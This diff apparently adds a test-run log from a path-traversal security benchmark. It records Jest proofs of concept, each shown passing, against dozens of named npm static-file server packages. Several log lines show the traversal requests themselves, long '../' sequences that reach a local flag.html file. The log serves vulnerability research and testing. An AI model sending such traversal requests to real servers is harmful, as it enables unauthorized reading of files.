@@ -1,0 +1,2547 @@
+path-traversal/angular-http-server_1.0.0/angular-http-server.test.js
+8000/tcp:           
+ PASS  ./angular-http-server.test.js
+  ✓ Path Traversal in angular-http-server (2043 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.271 s, estimated 3 s
+Ran all test suites matching path-traversal/angular-http-server_1.0.0/angular-http-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/angular-http-server_1.0.0/angular-http-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/welcomyzt_1.1.0/welcomyzt.test.js
+9987/tcp:           
+ PASS  ./welcomyzt.test.js
+  ✓ Path Traversal in welcomyzt (2062 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.375 s
+Ran all test suites matching path-traversal/welcomyzt_1.1.0/welcomyzt.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/welcomyzt_1.1.0/welcomyzt.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverzyqzyq_1.1.0/serverzyqzyq.test.js
+8888/tcp:           
+ PASS  ./serverzyqzyq.test.js
+  ✓ Path Traversal in serverzyqzyq (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.356 s
+Ran all test suites matching path-traversal/serverzyqzyq_1.1.0/serverzyqzyq.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverzyqzyq_1.1.0/serverzyqzyq.test.js'], returncode=0)
+TEST PASSED
+path-traversal/webrepl_0.4.7/webrepl.test.js
+ PASS  ./webrepl.test.js
+  ✓ Path Traversal in webrepl (52 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.29 s
+Ran all test suites matching path-traversal/webrepl_0.4.7/webrepl.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/webrepl_0.4.7/webrepl.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverzyy_1.0.0/serverzyy.test.js
+8888/tcp:           
+ PASS  ./serverzyy.test.js
+  ✓ Path Traversal in serverzyy (2062 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.366 s
+Ran all test suites matching path-traversal/serverzyy_1.0.0/serverzyy.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverzyy_1.0.0/serverzyy.test.js'], returncode=0)
+TEST PASSED
+path-traversal/hftp_0.0.6/hftp.test.js
+ PASS  ./hftp.test.js
+  ✓ Path Traversal in hftp (2120 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.361 s
+Ran all test suites matching path-traversal/hftp_0.0.6/hftp.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/hftp_0.0.6/hftp.test.js'], returncode=0)
+TEST PASSED
+path-traversal/http-file-server_0.2.6/http-file-server.test.js
+8080/tcp:           
+ PASS  ./http-file-server.test.js
+  ✓ Path Traversal in http-file-server (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.359 s
+Ran all test suites matching path-traversal/http-file-server_0.2.6/http-file-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/http-file-server_0.2.6/http-file-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/cuciuci_1.1.0/cuciuci.test.js
+8888/tcp:           
+ PASS  ./cuciuci.test.js
+  ✓ Path Traversal in cuciuci (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.369 s
+Ran all test suites matching path-traversal/cuciuci_1.1.0/cuciuci.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/cuciuci_1.1.0/cuciuci.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serve46_1.0.0/serve46.test.js
+8888/tcp:           
+ PASS  ./serve46.test.js
+  ✓ Path Traversal in serve46 (2057 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.385 s
+Ran all test suites matching path-traversal/serve46_1.0.0/serve46.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serve46_1.0.0/serve46.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ltt_1.1.0/ltt.test.js
+8888/tcp:           
+ PASS  ./ltt.test.js
+  ✓ Path Traversal in ltt (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.371 s
+Ran all test suites matching path-traversal/ltt_1.1.0/ltt.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ltt_1.1.0/ltt.test.js'], returncode=0)
+TEST PASSED
+path-traversal/bitty_0.1.0/bitty.test.js
+4000/tcp:           
+ PASS  ./bitty.test.js
+  ✓ Path Traversal in bitty (2060 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.374 s
+Ran all test suites matching path-traversal/bitty_0.1.0/bitty.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/bitty_0.1.0/bitty.test.js'], returncode=0)
+TEST PASSED
+path-traversal/public_0.1.2/public.test.js
+  console.log
+    <!DOCTYPE html>
+    <html>
+    <body>
+    
+    <h1>CISPA</h1>
+    <p>vulns4js! is here.</p>
+    
+    </body>
+    </html>
+
+      at log (public.test.js:32:13)
+
+3000/tcp:           
+ PASS  ./public.test.js
+  ✓ Path Traversal in public (2071 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.395 s
+Ran all test suites matching path-traversal/public_0.1.2/public.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/public_0.1.2/public.test.js'], returncode=0)
+TEST PASSED
+path-traversal/dylmomo_1.0.0/dylmomo.test.js
+8888/tcp:           
+ PASS  ./dylmomo.test.js
+  ✓ Path Traversal in dylmomo (2046 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.372 s
+Ran all test suites matching path-traversal/dylmomo_1.0.0/dylmomo.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/dylmomo_1.0.0/dylmomo.test.js'], returncode=0)
+TEST PASSED
+path-traversal/cuiaiguang_1.0.0/cuiaiguang.test.js
+8888/tcp:           
+ PASS  ./cuiaiguang.test.js
+  ✓ Path Traversal in cuiaiguang (2068 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.416 s
+Ran all test suites matching path-traversal/cuiaiguang_1.0.0/cuiaiguang.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/cuiaiguang_1.0.0/cuiaiguang.test.js'], returncode=0)
+TEST PASSED
+path-traversal/wind-mvc_0.0.6/wind-mvc.test.js
+8080/tcp:           
+ PASS  ./wind-mvc.test.js
+  ✓ Path Traversal in wind-mvc (2070 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.489 s
+Ran all test suites matching path-traversal/wind-mvc_0.0.6/wind-mvc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/wind-mvc_0.0.6/wind-mvc.test.js'], returncode=0)
+TEST PASSED
+path-traversal/xbhxbh_1.1.0/xbhxbh.test.js
+8888/tcp:           
+ PASS  ./xbhxbh.test.js
+  ✓ Path Traversal in xbhxbh (2060 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.392 s
+Ran all test suites matching path-traversal/xbhxbh_1.1.0/xbhxbh.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/xbhxbh_1.1.0/xbhxbh.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverabc_1.0.0/serverabc.test.js
+8888/tcp:           
+ PASS  ./serverabc.test.js
+  ✓ Path Traversal in serverabc (2055 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.371 s
+Ran all test suites matching path-traversal/serverabc_1.0.0/serverabc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverabc_1.0.0/serverabc.test.js'], returncode=0)
+TEST PASSED
+path-traversal/starfruit_0.2.2/starfruit.test.js
+  console.log
+    2:35:08 AM - GET /../../flag.html, Content-Type text/html, 200 (12ms)
+
+      at Function.module.exports.Server.log (node_modules/starfruit/lib/server.js:115:17)
+
+ PASS  ./starfruit.test.js
+  ✓ Path Traversal in starfruit (2099 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.334 s
+Ran all test suites matching path-traversal/starfruit_0.2.2/starfruit.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/starfruit_0.2.2/starfruit.test.js'], returncode=0)
+TEST PASSED
+path-traversal/http-live-simulator_1.0.0/http-live-simulator.test.js
+8080/tcp:           
+ PASS  ./http-live-simulator.test.js
+  ✓ Path Traversal in http-live-simulator (2462 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.78 s
+Ran all test suites matching path-traversal/http-live-simulator_1.0.0/http-live-simulator.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/http-live-simulator_1.0.0/http-live-simulator.test.js'], returncode=0)
+TEST PASSED
+path-traversal/proxey_0.4.2/proxey.test.js
+  console.log
+    Running in port: 8981
+
+      at Proxey.run (node_modules/proxey/proxey.js:201:10)
+
+ PASS  ./proxey.test.js
+  ✓ Path Traversal in proxey (51 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.283 s
+Ran all test suites matching path-traversal/proxey_0.4.2/proxey.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/proxey_0.4.2/proxey.test.js'], returncode=0)
+TEST PASSED
+path-traversal/gaoxuyan_1.1.0/gaoxuyan.test.js
+8888/tcp:           
+ PASS  ./gaoxuyan.test.js
+  ✓ Path Traversal in gaoxuyan (2043 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.363 s
+Ran all test suites matching path-traversal/gaoxuyan_1.1.0/gaoxuyan.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/gaoxuyan_1.1.0/gaoxuyan.test.js'], returncode=0)
+TEST PASSED
+path-traversal/asset-cache_0.0.6/asset-cache.test.js
+  console.log
+    	Asset server using dir /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/asset-cache_0.0.6
+
+      at Object.<anonymous> (node_modules/asset-cache/lib/asset-cache.js:14:9)
+
+ PASS  ./asset-cache.test.js
+  ✓ Path Traversal in asset-cache (55 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.289 s
+Ran all test suites matching path-traversal/asset-cache_0.0.6/asset-cache.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/asset-cache_0.0.6/asset-cache.test.js'], returncode=0)
+TEST PASSED
+path-traversal/fakelearnnodejs_0.0.1/fakelearnnodejs.test.js
+3000/tcp:           
+ PASS  ./fakelearnnodejs.test.js
+  ✓ Path Traversal in fakelearnnodejs (2065 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.378 s
+Ran all test suites matching path-traversal/fakelearnnodejs_0.0.1/fakelearnnodejs.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/fakelearnnodejs_0.0.1/fakelearnnodejs.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverxh_1.0.0/serverxh.test.js
+8888/tcp:           
+ PASS  ./serverxh.test.js
+  ✓ Path Traversal in serverxh (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.37 s
+Ran all test suites matching path-traversal/serverxh_1.0.0/serverxh.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverxh_1.0.0/serverxh.test.js'], returncode=0)
+TEST PASSED
+path-traversal/cxy_1.1.0/cxy.test.js
+8081/tcp:           
+ PASS  ./cxy.test.js
+  ✓ Path Traversal in cxy (2062 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.374 s
+Ran all test suites matching path-traversal/cxy_1.1.0/cxy.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/cxy_1.1.0/cxy.test.js'], returncode=0)
+TEST PASSED
+path-traversal/servewuqianqianqian_1.0.0/servewuqianqianqian.test.js
+8888/tcp:           
+ PASS  ./servewuqianqianqian.test.js
+  ✓ Path Traversal in servewuqianqianqian (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.36 s
+Ran all test suites matching path-traversal/servewuqianqianqian_1.0.0/servewuqianqianqian.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/servewuqianqianqian_1.0.0/servewuqianqianqian.test.js'], returncode=0)
+TEST PASSED
+path-traversal/severzlt_1.0.0/severzlt.test.js
+8888/tcp:           
+ PASS  ./severzlt.test.js
+  ✓ Path Traversal in severzlt (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.367 s
+Ran all test suites matching path-traversal/severzlt_1.0.0/severzlt.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/severzlt_1.0.0/severzlt.test.js'], returncode=0)
+TEST PASSED
+path-traversal/yyooopack_3.0.0/yyooopack.test.js
+8888/tcp:           
+ PASS  ./yyooopack.test.js
+  ✓ Path Traversal in yyooopack (2041 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.366 s
+Ran all test suites matching path-traversal/yyooopack_3.0.0/yyooopack.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/yyooopack_3.0.0/yyooopack.test.js'], returncode=0)
+TEST PASSED
+path-traversal/intsol-package_1.0.0/intsol-package.test.js
+9000/tcp:           
+ PASS  ./intsol-package.test.js
+  ✓ Path Traversal in intsol-package (2056 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.381 s
+Ran all test suites matching path-traversal/intsol-package_1.0.0/intsol-package.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/intsol-package_1.0.0/intsol-package.test.js'], returncode=0)
+TEST PASSED
+path-traversal/looppake_3.0.0/looppake.test.js
+8888/tcp:           
+ PASS  ./looppake.test.js
+  ✓ Path Traversal in looppake (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.365 s
+Ran all test suites matching path-traversal/looppake_3.0.0/looppake.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/looppake_3.0.0/looppake.test.js'], returncode=0)
+TEST PASSED
+path-traversal/willvdb_test_server_0.0.0/willvdb_test_server.test.js
+ PASS  ./willvdb_test_server.test.js
+  ✓ Path Traversal in willvdb_test_server (34 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.265 s
+Ran all test suites matching path-traversal/willvdb_test_server_0.0.0/willvdb_test_server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/willvdb_test_server_0.0.0/willvdb_test_server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/paopao613_1.0.0/paopao613.test.js
+8888/tcp:           
+ PASS  ./paopao613.test.js
+  ✓ Path Traversal in paopao613 (2054 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.376 s
+Ran all test suites matching path-traversal/paopao613_1.0.0/paopao613.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/paopao613_1.0.0/paopao613.test.js'], returncode=0)
+TEST PASSED
+path-traversal/nodejsccc_1.0.0/nodejsccc.test.js
+8888/tcp:           
+ PASS  ./nodejsccc.test.js
+  ✓ Path Traversal in nodejsccc (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.354 s
+Ran all test suites matching path-traversal/nodejsccc_1.0.0/nodejsccc.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/nodejsccc_1.0.0/nodejsccc.test.js'], returncode=0)
+TEST PASSED
+path-traversal/node-simple-router_0.10.0/node-simple-router.test.js
+  console.log
+    ::ffff:127.0.0.1 - [7/21/2025, 2:35:56 AM] - GET /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html - HTTP 1.1
+
+      at final_dispatch (node_modules/node-simple-router/lib/router.js:255:20)
+
+ PASS  ./node-simple-router.test.js
+  ✓ Path Traversal in node-simple-router (68 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.324 s
+Ran all test suites matching path-traversal/node-simple-router_0.10.0/node-simple-router.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/node-simple-router_0.10.0/node-simple-router.test.js'], returncode=0)
+TEST PASSED
+path-traversal/crud-file-server_0.7.0/crud-file-server.test.js
+8998/tcp:           
+ PASS  ./crud-file-server.test.js
+  ✓ Path Traversal in crud-file-server (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.383 s
+Ran all test suites matching path-traversal/crud-file-server_0.7.0/crud-file-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/crud-file-server_0.7.0/crud-file-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/cypserver_1.0.0/cypserver.test.js
+8888/tcp:           
+ PASS  ./cypserver.test.js
+  ✓ Path Traversal in cypserver (2044 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.361 s
+Ran all test suites matching path-traversal/cypserver_1.0.0/cypserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/cypserver_1.0.0/cypserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rjpserver_1.0.0/rjpserver.test.js
+8888/tcp:           
+ PASS  ./rjpserver.test.js
+  ✓ Path Traversal in rjpserver (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.367 s
+Ran all test suites matching path-traversal/rjpserver_1.0.0/rjpserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rjpserver_1.0.0/rjpserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/infraserver_0.0.1/infraserver.test.js
+46372/tcp:          
+ PASS  ./infraserver.test.js
+  ✓ Path Traversal in infraserver (2045 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.357 s
+Ran all test suites matching path-traversal/infraserver_0.0.1/infraserver.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/infraserver_0.0.1/infraserver.test.js'], returncode=0)
+TEST PASSED
+path-traversal/ltt.js_1.0.0/ltt_js.test.js
+8888/tcp:           
+ PASS  ./ltt_js.test.js
+  ✓ Path Traversal in ltt.js (2050 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.365 s
+Ran all test suites matching path-traversal/ltt.js_1.0.0/ltt_js.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/ltt.js_1.0.0/ltt_js.test.js'], returncode=0)
+TEST PASSED
+path-traversal/caolilinode1_1.0.0/caolilinode1.test.js
+8888/tcp:           
+ PASS  ./caolilinode1.test.js
+  ✓ Path Traversal in caolilinode1 (2049 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.406 s
+Ran all test suites matching path-traversal/caolilinode1_1.0.0/caolilinode1.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/caolilinode1_1.0.0/caolilinode1.test.js'], returncode=0)
+TEST PASSED
+path-traversal/lessindex_1.0.0/lessindex.test.js
+8888/tcp:           
+ PASS  ./lessindex.test.js
+  ✓ Path Traversal in lessindex (2048 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.379 s
+Ran all test suites matching path-traversal/lessindex_1.0.0/lessindex.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/lessindex_1.0.0/lessindex.test.js'], returncode=0)
+TEST PASSED
+path-traversal/node-srv_2.0.0/node-srv.test.js
+  console.log
+    [2025-07-21T00:36:22.665Z] (+7ms): 200 ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html - /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html (curl/8.5.0)
+
+      at Server.log (node_modules/node-srv/lib/server.js:247:53)
+
+ PASS  ./node-srv.test.js
+  ✓ Path Traversal in node-srv (61 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.293 s
+Ran all test suites matching path-traversal/node-srv_2.0.0/node-srv.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/node-srv_2.0.0/node-srv.test.js'], returncode=0)
+TEST PASSED
+path-traversal/simple-mock-server_0.2.1/simple-mock-server.test.js
+8080/tcp:           
+ PASS  ./simple-mock-server.test.js
+  ✓ Path Traversal in simple-mock-server (2056 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.39 s
+Ran all test suites matching path-traversal/simple-mock-server_0.2.1/simple-mock-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/simple-mock-server_0.2.1/simple-mock-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/rtcmulticonnection-client_1.0.5/rtcmulticonnection-client.test.js
+8080/tcp:           
+ PASS  ./rtcmulticonnection-client.test.js
+  ✓ Path Traversal in rtcmulticonnection-client (2057 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.39 s
+Ran all test suites matching path-traversal/rtcmulticonnection-client_1.0.5/rtcmulticonnection-client.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/rtcmulticonnection-client_1.0.5/rtcmulticonnection-client.test.js'], returncode=0)
+TEST PASSED
+path-traversal/nitro-server_1.3.3/nitro-server.test.js
+  console.log
+    
+    Static file server running at
+      => http://localhost:8080/
+    CTRL + C to shutdown
+    
+
+      at Server.<anonymous> (node_modules/nitro-server/server.js:182:17)
+
+  console.log
+    Root directory is: /home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/nitro-server_1.3.3
+
+      at Server.<anonymous> (node_modules/nitro-server/server.js:183:17)
+
+  console.log
+    [200] /../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/bombe/UniSaarland/Websec-Seminar/SecBench.js/path-traversal/flag.html  (text/html; charset=UTF-8)
+
+      at node_modules/nitro-server/server.js:163:21
+
+ PASS  ./nitro-server.test.js
+  ✓ Path Traversal in nitro-server (89 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.319 s
+Ran all test suites matching path-traversal/nitro-server_1.3.3/nitro-server.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/nitro-server_1.3.3/nitro-server.test.js'], returncode=0)
+TEST PASSED
+path-traversal/serverhuwenhui_1.1.0/serverhuwenhui.test.js
+55555/tcp:          
+ PASS  ./serverhuwenhui.test.js
+  ✓ Path Traversal in serverhuwenhui (2047 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        2.359 s
+Ran all test suites matching path-traversal/serverhuwenhui_1.1.0/serverhuwenhui.test.js.
+Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
+CompletedProcess(args=['npx', 'jest', '--forceExit', 'path-traversal/serverhuwenhui_1.1.0/serverhuwenhui.test.js'], returncode=0)
+TEST PASSED
+path-traversal/web-node-server_0.1.0/web-node-server.test.js
+  console.log
+    server running at 9999
+
+      at Object.start (node_modules/web-node-server/nodeserver.js:101:11)
+
+ PASS  ./web-node-server.test.js
